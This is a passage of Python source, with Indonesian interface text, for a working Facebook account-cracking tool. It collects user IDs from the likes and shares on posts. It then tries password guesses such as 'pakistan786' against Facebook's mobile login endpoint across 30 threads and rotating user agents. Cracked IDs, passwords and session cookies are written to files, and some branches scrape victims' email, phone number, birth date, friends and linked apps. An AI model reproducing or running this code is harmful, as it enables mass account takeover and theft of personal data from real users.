		print(f"{B} | ")
		print(f"{P}[•] {M}Koneksi internet bermasalah, priksa dan coba lagi")
		exit()
	try:
		po = requests.get(f'https://graph.facebook.com/{pil}?fields=name,likes.fields(id,name).limit(5000)&access_token={token}').json()
		for i in po['likes']['data']:
			id.append(f"{i['id']}|{i['name']}")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"\r{P}[•] Mengumpulkan id {B}-----> {K}{len(id)}",end="")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Total pengum pulan id : {I}{str(len(id))}")
		proses_crackkk()
	except requests.exceptions.ConnectionError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Koneksi anda bermasalah ")
		exit()
	except (KeyError,IOError):
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Pertemanan tidak publik atau token rusak")
		exit()
		
def lah():
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"\r{P}[•] Total id : {I}{str(len(id))}")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	input(f"{P}[•] {I}Gunakan mode pesawat 5 detik lalu tekan enter")
	pass
	proses_crackkk()

def likes():
	try:
		toket = open('masuk.txt', 'r').read()
	except IOError:
		os.system('rm -rf masuk.txt')
		time.sleep(0.01)
		os.sys.exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Pastikan id postingan bersifat publik yah ")
	print(f"{B} | ")
	print(f"{B} | ")
	idt = input(f"{P}[•] Masukan id postingan : {B}")
	try:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		jumlah = int(input(f"{P}[•] Masukan limit : {B}"))
		if jumlah>20000:
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{B} | ")
			print(f"{P}[•] {M}Maksimal 20000 id")
			time.sleep(0.5)
			likes()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit="+str(jumlah)+"&access_token="+toket)
		z = json.loads(r.text)
		for a in z['data']:
			idne = a['id']
			jenenge = a["name"]
			id.append(idne+'|'+jenenge)
	except KeyError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] Pertememanan tidak publik atau token modar")
		exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Total : {I}{str(len(id))}")
	proses_crackkk ()
def share():
	try:
		toket = open('masuk.txt', 'r').read()
	except IOError:
		os.system('rm -rf masuk.txt')
		time.sleep(0.01)
		os.sys.exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] {M}Pastikan id postingan publik")
	print(f"{B} | ")
	print(f"{B} | ")
	idt = input(f"{P}[•] Masukan id postingan : {B}")
	try:
		r=requests.get("https://graph.facebooklcom/me/feed?link={idt}&published=0&access_token={token}")
		z = json.loads(r.text)
		for a in z['data']:
			idne = a['id']
			jenenge = a["name"]
			id.append(idne+'|'+jenenge)
	except KeyError:
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{B} | ")
		print(f"{P}[•] {M}Pertemanan tidak di publikan atau token modar")
		exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{P}[•] Total : {I}{str(len(id))}")
	proses_crackkk ()


def proses_crackkk():
	print(f"{P}[•] Urutan id untuk di crack ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"""{P}[1] Urutan id muda
[2] Urutan id tua
[3] Urutan id random {I}Recomended""")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	nano_silent_jeeck = input(f"{P}[•] Input : {B}")
	if nano_silent_jeeck in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif nano_silent_jeeck in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
	elif nano_silent_jeeck in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('PILIHAN TIDAK ADA DI MENU')
		exit()
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"""{P}[1] B-api
[2] Mbasic
[3] Mbasic V2
[4] Mobile {I}Recomended{P}
[5] Mobile {I}Recomended && pemunculan aplikasi{P}
[6] Mobile {I}Recomended && pemunculan aplikasi V1{P}
[7] Mobile {I}Recomended && pemucnulan aplikasi V2""")
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	_nano_silent_ = input(f"{P}[•] Input : {B}")
	if _nano_silent_ in ['1','01']:
		method.append('api')
	elif _nano_silent_ in ['4','04']:
		method.append('mobile')
	elif _nano_silent_ in ['5','05']:
		method.append('mobilapk')
		taplikasi.append('Yess')
		passwrd()
	elif _nano_silent_ in ['6','06']:
		method.append('freeapk')
		taplikasi.append('Yess')
		passwrd()
	elif _nano_silent_ in ['7','07']:
		method.append('mobil7')
		taplikasi.append('Yees')
		passwrd()
	elif _nano_silent_ in ['3','03']:
		method.append('mbasic')
	else:
		method.append('free')
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	taplikasi.append('no')
	passwrd()

# WORDLIST
def passwrd():
	print(f"{B} | ")
	print(f"{B} | ")
	print(f"{B} | ")
	print(" -------------------------------------->")
	print("  Crack Started ")
	print("  Use Airplane Mode Ervy 5 mint ")
	print(" -------------------------------------->")
	with tred(max_workers=30) as pool:
		for crackkkk in id2:
			idf,nmf = crackkkk.split('|')[0],crackkkk.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['pakistan786','pakistan']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append('pakistan123')
			else:
				if len(frs)<3:
					pwv.append('pakistan123')
				else:
					pwv.append('pakistan123')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'api' in method:
				pool.submit(crack2,idf,pwv)
			elif 'free' in method:
				pool.submit(crack3,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crack4,idf,pwv)
			elif 'mobilapk' in method:
				pool.submit(crack5,idf,pwv)
			elif 'freeapk' in method:
				pool.submit(crack1,idf,pwv)
			elif 'mobil7' in method:
				pool.submit(crack7,idf,pwv) 
			else:
				pool.submit(crack,idf,pwv)
	print('')
	print(' ')
	woi = input(x+'['+h+'Y'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()
emot = random.choice(["😁","😂","😊","😇","😉","😌","😍","😘","😝","🤑","😗","😃","😄","😙","😉","☺","😅","😆","😗","😠","😣","😱"])

def crack7(idf,pwv):
	global loop,ok,cp
	bi = random.choice([U,P,B,b,I,K,M])
	dom = random.choice([U,P,B,b,I,K,M])
	emot = random.choice(["😁", "😂", "😇", "😂", "😎", "😝", "😜", "😞", "😟", "😠", "😡", "😤", "😪", "😭", "🤓", "🙃", "😊", "😍", "😵", "🤕", "😴"])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write(f"\r {emot} {bi}+++++++> {dom} {loop}/{len(id2)}  {I}OK {P}: {b}{ok} {K}CP : {b}{cp}");sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print(f"""\r{P}[•]------>{K}Chekpoints
{B} |
{P}[•]{B}-------------------------------------->
{B} |
{P}[•] User id  : {K}{idf}
{P}[•] Password : {U}{pw}
{B} |
{P}[•]{B}-------------------------------------->\n""")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print(f'\r{h}{idf} • {pw}')
					print(f'\r{h} |_Cookie : {kuki}')
					break
				elif "c_user" in ses.cookies.get_dict().keys():
					headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
					if 'Yess' in taplikasi:
						ok+=1
						coki=po.cookies.get_dict()
						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
						open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
						print(f"""\r{P}[•]------>{I}Sukses
{B} |
{P}[•]{B}-------------------------------------->
{B} |
{P}[•] User id  : {I}{idf}
{P}[•] Password : {U}{pw}
{B} |
{P}[•]{B}-------------------------------------->
{B} |
{P}[•] Cookie   : {b}{kuki}\n""")
						cek_apk(kuki)
						break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += (f"[✓] Nama Akun       : {nama}\n[✓] Jumlah Teman    : {teman}\n[✓] Jumlah Pengikut : {pengikut}\n[✓] Email Aktif     : {email}\n[✓] Nomor Aktif     : {nomer}\n[✓] Tahun Akun      : {tahun}\n[✓] Tanggal Lahir   : {ttl}\n")

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/proses_crackkks/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/proses_crackkks/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					#print('\n')
					print(f'\r{h}{idf} • {pw} • {kuki}\n{infoakun}')
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crack1(idf,pwv):
	global loop,ok,cp
	bi = random.choice([U,P,B,b,I,K,M])
	dom = random.choice([U,P,B,b,I,K,M])
	emot = random.choice(["😁", "😂", "😇", "😂", "😎", "😝", "😜", "😞", "😟", "😠", "😡", "😤", "😪", "😭", "🤓", "🙃", "😊", "😍", "😵", "🤕", "😴"])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write(f"\r {emot} {bi}+++++++> {dom} {loop}/{len(id2)}  {I}OK {P}: {b}{ok} {K}CP : {b}{cp}");sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
#			headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T875 Build/RP1A.200 720.012) AppleWebKit /537.36 (KHTML, like Gecko) Version /4.0 Chrome /96.0.4664.104 Safari/537.36 GNews Android /2022034746 UNTRUSTED/1.0","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; U; Android 9; LGL722DL Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 OPR/60.0.2254.59405"])
			headers_ = {
	                "Host":"m.facebook.com",
        	        "upgrade-insecure-requests":"1",
	                "user-agent":ua,
	                "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closery]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	                "dnt":"1","x-requested-with":"mark.via.gp",
	                "sec-fetch-site":"same-origin",
	                "sec-fetch-mode":"cors",
	                "sec-fetch-user":"empty",
	                "sec-fetch-dest":"document",
	                "referer":"https://m.facebook.com/",
	                "accept-encoding":"gzip, deflate br",
	                "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
        	        }
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print(f"""\r{P}[•]------>{K}Chekpoints
{B} |
{P}[•]{B}-------------------------------------->
{B} |
{P}[•] User id  : {K}{idf}
{P}[•] Password : {U}{pw}
{B} |
{P}[•]{B}-------------------------------------->\n""")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print(f'\r{h}{idf} • {pw}')
					print(f'\r{h} |_Cookie : {kuki}')
					break
				elif "c_user" in ses.cookies.get_dict().keys():
					headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
					if 'Yess' in taplikasi:
						ok+=1
						coki=po.cookies.get_dict()
						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
						open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
						print(f"""\r{P}[•]------>{I}Sukses
{B} |
{P}[•]{B}-------------------------------------->
{B} |
{P}[•] User id  : {I}{idf}
{P}[•] Password : {U}{pw}
{B} |
{P}[•]{B}-------------------------------------->
{B} |
{P}[•] Cookie   : {b}{kuki}\n""")
						cek_apk(kuki)
						break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += (f"[✓] Nama Akun       : {nama}\n[✓] Jumlah Teman    : {teman}\n[✓] Jumlah Pengikut : {pengikut}\n[✓] Email Aktif     : {email}\n[✓] Nomor Aktif     : {nomer}\n[✓] Tahun Akun      : {tahun}\n[✓] Tanggal Lahir   : {ttl}\n")

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/proses_crackkks/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/proses_crackkks/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					#print('\n')
					print(f'\r{h}{idf} • {pw} • {kuki}\n{infoakun}')
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def crack5(idf,pwv):
	global loop,ok,cp
	bi = random.choice([U,P,B,b,I,K,M])
	dom = random.choice([U,P,B,b,I,K,M])
	emot = random.choice(["😁", "😂", "😇", "😂", "😎", "😝", "😜", "😞", "😟", "😠", "😡", "😤", "😪", "😭", "🤓", "🙃", "😊", "😍", "😵", "🤕", "😴"])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write(f"\r {emot} {bi}+++++++> {dom} {loop}/{len(id2)}  {I}OK {P}: {b}{ok} {K}CP : {b}{cp}");sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			headers_ = {"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
			dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			_headers = {"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print(f"""\r{P}[•]------>{K}Chekpoints
{B} |
{P}[•]{B}-------------------------------------->
{B} |
{P}[•] User id  : {K}{idf}
{P}[•] Password : {U}{pw}
{B} |
{P}[•]{B}-------------------------------------->\n""")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
				if 'no' in taplikasi:
